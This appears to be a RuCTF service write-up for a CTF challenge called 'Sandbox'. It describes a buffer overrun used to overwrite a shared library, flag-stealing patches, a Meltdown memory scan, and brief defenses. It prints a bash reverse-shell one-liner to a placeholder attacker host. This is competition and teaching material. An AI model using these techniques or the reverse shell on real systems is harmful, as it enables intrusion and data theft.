# Sandbox

The service consists of a backend binary and two proxies that run in separate docker containers.

## How to attack

### First proxy (:16780)

There is a library, libinterface.so, that contains code responsible for interaction with the backend. All the following sploits show different ways to tamper with that library.

In order to do so you can exploit a buffer overrun in the parse_uuid function.

It allows you to overwrite fileno used when communicating with the backend and thus overwrite a 32-byte portion of libinterface.so on the victim system. 
By repeating this attack it is possible to overwrite the entire library.

See [upload_so.py](upload_so.py) for implementation.

#### Sploit #1

The easiest way to start getting flags is to change host:port used in the AddUnit function to the address of the attacker's machine.
This way the attacker will receive all the new flags, but the service will be down for the victim.

[Example code](fwd1/)


#### Sploit #2:

A more complicated approach would be to duplicate flags to the attackers machine, leaving the victim's service fully functional.

Also it's better to hook the GetUnit function instead of AddUnit, because it allows to access old flags as well.

The only problem is that the modified function must have the same byte-size as the original one, so some byte-juggling may be required to make it work.

[Example code](fwd2/)


#### Sploit #3:

The third and the most universal approach is to call system() on the victim machine.

In order to do so you have to do some calculations with addresses and produce a patch as described in [shell.asm](shell/shell.asm).

Then you may fire up a reverse shell, for example:  
`bash -c "bash -i >& /dev/tcp/<attacker-ip>/<attacker-port> 0>&1 &" &`

And then do what you wish. For example, upload another patched .so, without the limit on the size of functions.

#### Bonus (all sploits)

In order to allow the pwned service to restart correctly, you must pad your version of libinterface.so with some garbage so that it's hash matches the hash of the original file (it's a simple 4-byte xor).

### Second proxy (:16781)

The second proxy has no bugs (known to us).

Just hack the first proxy to gain a shell on the victim system and execute the Meltdown attack.   
You must scan the entire physical memory to find the flag storage and then read it all :)

## How to defend

1. Replace proxy #1 with proxy #2.
2. Turn off Meltdown support in kernel boot options.  

## Update
Sandbox was hacked on second day after RuCTF by v0s. He used a ROP technique:
https://gist.github.com/v0s/1933e025dc61c2dfe32a61f79b959c11

